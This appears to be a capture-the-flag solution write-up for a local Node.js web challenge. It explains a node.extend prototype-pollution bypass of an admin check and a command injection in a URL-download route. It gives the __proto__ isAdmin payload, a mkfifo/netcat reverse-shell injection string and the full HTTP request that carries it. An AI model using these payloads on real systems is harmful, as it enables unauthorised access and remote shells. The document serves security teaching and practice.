# Solution

## Recon

By opening the URL http://127.0.0.1:3333, we can see that a Singin Page has provided the following credential to log in as a guest user:

* **Username**: *guest*
* **Password**: *pass123*

So let's use them to log in and see more entry points.

![Credentials](https://i.ibb.co/gPmx1Qd/1-guest-account.png)

After signing, we can see a Url Downloader mechanism, but the guest user doesn't have permission to use this feature.

![NotAdmin](https://i.ibb.co/wQKHnMg/4-you-arenotetheadmin.png)

It's always a good idea to check what cookie the Web Site is using, in this case, after the login, the server provided the **admin_session** cookie, which is how the server knows that we are logged in as a guest.

![LogIn](https://i.ibb.co/89Xnqhx/3-login-response.png)

The cookie is apparently safe, so let's take a look at the source code.
At the source code, in the routes.js file, we can see that there is a credential DB with the guest and admin username and password. Looking with attention, you can see that the following value is set to the admin account:

```
 "isAdmin":true
```

Looking at the route **/admin/check_url** (the route used to download the URL), you can see a **checkLogin** and a **checkAdmin** function, responsible to grant or deny access to users that called this route.

![check_url](https://i.ibb.co/HHqcHFC/7-check-url-code.png)

There is a command execution after the isAdmin check, passing the chosen URL to the command without arguments scaping. So if we gain administrative permissions, we can easily trigger a remote command execution vulnerability.

Since we don't have the admin credentials, because it's a random string, let's take a look into the **checkLogin** and **checkAdmin** functions to see if we find a bypass.

Well, there is nothing interesting in the **checkLogin** function, since we already have a valid credential, let's look the **checkAdmin** function:

![checkAdmin](https://i.ibb.co/7WTsWmj/8-check-admin-code.png)

This function checks if the requested cookie has administrative permissions, the parameter that defines it is the `isAdmin`, that we already have noted above. But, the guest user doesn't have this permission, and this code is apparently secure, how can we bypass it? Well, let's take a deep look into the code.

Looking with attention to the **/admin/check_url** route, we can see that the developer has implemented a security log feature, defined by the **securityLog** function. This function will be trigged when a non-valid user tries to call this API.

![securityLogCall](https://i.ibb.co/L96PzGn/12e076f8-b9f3-40e4-ac53-e1474e916b64.jpg)

Looking at the function code we can see that it's using the **node.extend** function to concatenate two different JSON into the **log** variable, that will be logged with the **console.log** function.

![securityLogCode](https://i.ibb.co/djx5FxN/9-security-Log-code.png)

As well known, the **node.extend** function is vulnerable to Prototype Pollution, witch can lead to the **credentials DB** pollution, allowing to bypass the **checkAdmin** function.

## Exploit
To exploit it, we need to send the following payload with an unauthenticated user to the `/admin/check_url` route, to trigger the **security Log** function.

```
{
  "__proto__":{
    "isAdmin":true
  }
}
```

The payload above will pollute the guest credential, given him administrative permission, E.g:

* Before Pollution:

```
{"username":"guest", "password":"pass123", "cookie": "' + crypto.randomBytes(64).toString("hex") + '"}
```

* After Pollution:

```
{"username":"guest", "password":"pass123", "cookie": "' + crypto.randomBytes(64).toString("hex") + '", "isAdmin":true}
```

*Remeber to change the **Content-Type** header to **Content-Type: application/json** and to remove the **admin_session**.*

* **Payload Request**:

![payloadRequest](https://i.ibb.co/RGnhyd0/17-is-Admintrue.png)


Now, if we make a request with the guest cookie again, you can see that we successfully bypass the **checkAdmin** function.

* **Request After Pollution**:

![requestAfterPollution](https://i.ibb.co/ZGR1HsR/18-after-polluted.png)

![afterPollution](https://i.ibb.co/mC2zwTP/19-after-bypass.png)

## Remote Command Execution and Reverse Shell

As commented above, we already find a Remote Command Execution vulnerability because the passed URL is being used as a command without argument scaping, vulnerable code bellow:

![vulnCode](https://i.ibb.co/SKgzSss/f4002b85-a445-45b1-8a9a-4a1f86361f3e.jpg)

To exploit it, we just need to add a shell command to the URL. So let's make a reverse shell!

First, let's wait for a connection on port 4444 with Netcat:

```
nc -lvp 4444
```

![netCat](https://i.ibb.co/5cQR3Mt/20-nc-lvp.png)

Now let's insert the following payload in the URL parameter to make the reverse shell on 127.0.0.1:4444:

````
;`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f` #
````

* **The Final Payload (Remote Code Execution with the Reverse Shell)**:

```
POST /admin/check_url HTTP/1.1
Host: 127.0.0.1:3333
Connection: keep-alive
Content-Length: 96
User-Agent: Mozilla/ (X11; Linux x86_64) AppleWebKit/ (KHTML, like Gecko) Chrome/
Content-type: application/json
Accept: */*
Origin: http://127.0.0.1:3333
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Referer: http://127.0.0.1:3333/admin?
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: admin_session=5f4863e522da99e347045bc4d6343a6d55ead1974b68ac7ac6d2c8cdb5d7bcb846a09442b4bef21447910e612d99506eaf5ffba4c381cb38fb0c4ff5abc37f54

{
 "url":";`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f` #"
}
```

How you can see in the picture below, we successfully got a reverse shell on the target:

![final](https://i.ibb.co/T24wMML/21-payload.png)
